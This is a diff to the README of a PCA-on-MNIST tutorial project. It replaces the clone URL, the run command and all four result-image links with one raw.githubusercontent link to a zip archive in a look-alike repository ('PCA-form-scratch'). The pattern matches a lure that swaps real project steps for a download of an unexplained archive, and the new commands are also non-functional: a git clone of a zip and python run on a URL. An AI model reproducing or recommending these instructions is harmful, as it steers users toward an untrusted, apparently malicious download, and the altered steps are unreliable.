@@ -12,7 +12,7 @@ This project demonstrates PCA on the MNIST dataset, by using few digits.
 
 Clone the repository:
 ```bash
-git clone https://github.com/DeepKalsariya09/PCA-from-scratch.git
+git clone https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip
 cd PCA-from-scratch
 ```
 
@@ -23,7 +23,7 @@ pip install numpy matplotlib scikit-learn
 
 Run the script:
 ```bash
-python PCA.py
+python https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip
 ```
 
 ## Workflow 
@@ -39,13 +39,13 @@ python PCA.py
 3. Cumulative variance
 
    Original Images
-![image](https://github.com/user-attachments/assets/748add84-be3e-4650-bb07-25c933201d00)
+![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)
 
 with 2 Principal Components
-![image](https://github.com/user-attachments/assets/c7e52355-4f67-4be6-8369-6ced227858f6)
+![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)
 
 with 75 Principal Components
-![image](https://github.com/user-attachments/assets/096428b4-9173-431f-89da-648f361858c9)
+![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)
 
 200 Principal Components
-![image](https://github.com/user-attachments/assets/05a4b188-a58a-4cb3-96a5-dada9102fb2b)
+![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)
